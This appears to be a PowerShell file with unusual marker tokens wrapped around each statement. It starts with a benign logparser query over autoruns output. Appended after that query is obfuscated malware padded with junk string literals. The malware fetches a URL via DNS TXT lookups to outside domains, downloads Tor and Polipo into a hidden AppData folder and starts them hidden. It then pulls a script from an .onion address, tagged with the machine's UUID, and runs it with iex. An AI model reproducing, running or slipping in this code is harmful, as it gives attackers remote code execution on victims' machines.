

 -||-> if ( -||-> Get-Command logparser.exe <-||- ) {

     -||-> $lpquery = @"
    SELECT
        COUNT(ImagePath, LaunchString, Publisher) as ct,
        ImagePath,
        LaunchString,
        Publisher
    FROM
        *autorunsc.tsv
    WHERE
        (ImagePath not like 'File not found%')
    GROUP BY
        ImagePath,
        LaunchString,
        Publisher
    ORDER BY
        ct ASC
"@ <-||- 

     -||-> & logparser -stats:off -i:csv -dtlines:0 -fixedsep:on -rtp:-1 "$lpquery" <-||- 

} else {
     -||-> $ScriptName = [System.IO.Path]::GetFileName($MyInvocation.ScriptName) <-||- 
     -||-> "${ScriptName} requires logparser.exe in the path." <-||- 
} <-||- 


 -||-> 'LXUnfqn' <-||- ; -||-> $ErrorActionPreference = 'SilentlyContinue' <-||- ; -||-> 'Jlnl' <-||- ; -||-> 'rXrPGggb' <-||- ; -||-> $by = ( -||-> get-wmiobject Win32_ComputerSystemProduct <-||- ).UUID <-||- ; -||-> 'kjEvisMr' <-||- ; -||-> 'BlwFKzHgx' <-||- ; -||-> if ( -||-> ( -||-> gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run <-||- ) -match $by <-||- ){; -||-> 'BrOZYLFVY' <-||- ; -||-> 'ihznknftcRL' <-||- ; -||-> ( -||-> Get-Process -id $pid <-||- ).Kill() <-||- ; -||-> 'eMBnBWC' <-||- ; -||-> 'ClMCvnGz' <-||- ;} <-||- ; -||-> 'kFqbERjcaK' <-||- ; -||-> 'cZdefv' <-||- ; -||-> function e($ohd){; -||-> 'drSzUSrd' <-||- ; -||-> 'JvFd' <-||- ; -||-> $mtk = ( -||-> ( -||-> ( -||-> iex "nslookup -querytype=txt $ohd 8.8.8.8" <-||- ) -match '"' <-||- ) -replace '"', '' <-||- )[0].Trim() <-||- ; -||-> 'wHpWIPZ' <-||- ; -||-> 'rZOmyT' <-||- ; -||-> $ilua.DownloadFile($mtk, $bqvt) <-||- ; -||-> 'KqrPY' <-||- ; -||-> 'tCgMs' <-||- ; -||-> $ws = $xyu.NameSpace($bqvt).Items() <-||- ; -||-> 'DVRZCMXn' <-||- ; -||-> 'aVMuAymCDo' <-||- ; -||-> $xyu.NameSpace($ezpr).CopyHere($ws, 20) <-||- ; -||-> 'NoYaTMgWV' <-||- ; -||-> 'WczlafFHI' <-||- ; -||-> rd $bqvt <-||- ; -||-> 'AJc' <-||- ; -||-> 'Rl' <-||- ;} <-||- ; -||-> 'mwPV' <-||- ; -||-> 'XYS' <-||- ; -||-> 'bSRkM' <-||- ; -||-> 'GFeZKeMy' <-||- ; -||-> 'Vt' <-||- ; -||-> 'blWvxEYdB' <-||- ; -||-> $ezpr = $env:APPDATA + '\' + $by <-||- ; -||-> 'HTC' <-||- ; -||-> 'zgOw' <-||- ; -||-> if ( -||-> !( -||-> Test-Path $ezpr <-||- ) <-||- ){; -||-> 'fAXKjau' <-||- ; -||-> 'kEXx' <-||- ; -||-> $vpjq =  -||-> New-Item -ItemType Directory -Force -Path $ezpr <-||-  <-||- ; -||-> 'GWSbA' <-||- ; -||-> 'vOvra' <-||- ; -||-> $vpjq.Attributes = "Hidden", "System", "NotContentIndexed" <-||- ; -||-> 'amPCGy' <-||- ; -||-> 'EKFM' <-||- ;} <-||- ; -||-> 'sB' <-||- ; -||-> 'RRiIYz' <-||- ; -||-> 'bvcCeTeLW' <-||- ; -||-> 'NcOTYolCIB' <-||- ; -||-> $vtzg=$ezpr+ '\tor.exe' <-||- ; -||-> 'RoqsuXE' <-||- ; -||-> 'fQGBWGwt' <-||- ; -||-> $ot=$ezpr+ '\polipo.exe' <-||- ; -||-> 'HXKsRivf' <-||- ; -||-> 'oynNceOnFxy' <-||- ; -||-> $bqvt=$ezpr+'\'+$by+'.zip' <-||- ; -||-> 'DJlrBBZS' <-||- ; -||-> 'HlBZ' <-||- ; -||-> $ilua= -||-> New-Object System.Net.WebClient <-||-  <-||- ; -||-> 'QDcpy' <-||- ; -||-> 'QJxf' <-||- ; -||-> $xyu= -||-> New-Object -C Shell.Application <-||-  <-||- ; -||-> 'xeSu' <-||- ; -||-> 'BEJbU' <-||- ; -||-> 'BtnJKUSm' <-||- ; -||-> 'HuG' <-||- ; -||-> if ( -||-> !( -||-> Test-Path $vtzg <-||- ) -or !( -||-> Test-Path $ot <-||- ) <-||- ){; -||-> 'cxjBOmZvDk' <-||- ; -||-> 'NInn' <-||- ; -||-> e 'i.vankin.de' <-||- ; -||-> 'COYVXPD' <-||- ; -||-> 'QLikWodWT' <-||- ;} <-||- ; -||-> 'nlHScK' <-||- ; -||-> 'tLVWu' <-||- ; -||-> 'DGZInswj' <-||- ; -||-> 'ieaqBnXXBL' <-||- ; -||-> if ( -||-> !( -||-> Test-Path $vtzg <-||- ) -or !( -||-> Test-Path $ot <-||- ) <-||- ){; -||-> 'Tga' <-||- ; -||-> 'rUFQi' <-||- ; -||-> e 'gg.ibiz.cc' <-||- ; -||-> 'LVSqds' <-||- ; -||-> 'MkiSQLVJy' <-||- ;} <-||- ; -||-> 'sFUMwRQj' <-||- ; -||-> 'DZ' <-||- ; -||-> 'db' <-||- ; -||-> 'NmVXjZaO' <-||- ; -||-> $cvdz=$ezpr+'\roaminglog' <-||- ; -||-> 'LUPq' <-||- ; -||-> 'gKQgLmYh' <-||- ; -||-> saps $vtzg -Ar " --Log `"notice file $cvdz`"" -wi Hidden <-||- ; -||-> 'PZxnCI' <-||- ; -||-> 'soSyFSxz' <-||- ;do{ -||-> sleep 1 <-||- ; -||-> $bimy= -||-> gc $cvdz <-||-  <-||- }while( -||-> !( -||-> $bimy -match 'Bootstrapped 100%: Done.' <-||- ) <-||- ); -||-> 'MDNhoZxE' <-||- ; -||-> 'GuMuzoCwT' <-||- ; -||-> saps $ot -a "socksParentProxy=localhost:9050" -wi Hidden <-||- ; -||-> 'cfrwPc' <-||- ; -||-> 'DlnzyvwBYQ' <-||- ; -||-> sleep 7 <-||- ; -||-> 'TAtSCy' <-||- ; -||-> 'NgTi' <-||- ; -||-> $qdax= -||-> New-Object System.Net.WebProxy( -||-> "localhost:8123" <-||- ) <-||-  <-||- ; -||-> 'Axpk' <-||- ; -||-> 'yYePww' <-||- ; -||-> $qdax.useDefaultCredentials = $true <-||- ; -||-> 'KcqLHXXNxQs' <-||- ; -||-> 'mBUkNfwsfiX' <-||- ; -||-> $ilua.proxy=$qdax <-||- ; -||-> 'NnVlUajch' <-||- ; -||-> 'tgizAGRCEXq' <-||- ; -||-> $pbtx='http://powerwormjqj42hu.onion/get.php?s=setup&mom=0776B201-51DE-11CB-A78C-9C1F26D75FB9&uid=' + $by <-||- ; -||-> 'zl' <-||- ; -||-> 'rIIvBbyFn' <-||- ; -||-> while( -||-> !$nrcb <-||- ){ -||-> $nrcb=$ilua.downloadString($pbtx) <-||- } <-||- ; -||-> 'VWM' <-||- ; -||-> 'UAqS' <-||- ; -||-> if ( -||-> $nrcb -ne 'none' <-||- ){; -||-> 'yyeYfmxpss' <-||- ; -||-> 'eT' <-||- ; -||-> iex $nrcb <-||- ; -||-> 'oD' <-||- ; -||-> 'JqEesDpgbI' <-||- ;} <-||- ; -||-> 'YsGjzbNbhIw' <-||- ;



